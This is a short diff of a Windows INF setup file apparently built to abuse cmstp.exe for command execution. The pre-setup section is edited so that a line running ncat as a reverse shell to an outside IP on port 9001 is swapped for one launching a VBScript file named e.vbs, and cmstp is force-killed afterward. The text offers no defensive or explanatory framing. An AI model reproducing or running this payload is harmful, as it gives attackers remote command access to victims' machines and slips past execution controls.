@@ -8,7 +8,7 @@ RunPreSetupCommands=RunPreSetupCommandsSection
  
 [RunPreSetupCommandsSection]
 ; Commands Here will be run Before Setup Begins to install
-ncat.exe 212.64.217.73 9001 -e cmd 
+e.vbs
 taskkill /IM cmstp.exe /F
  
 [CustInstDestSectionAllUsers]
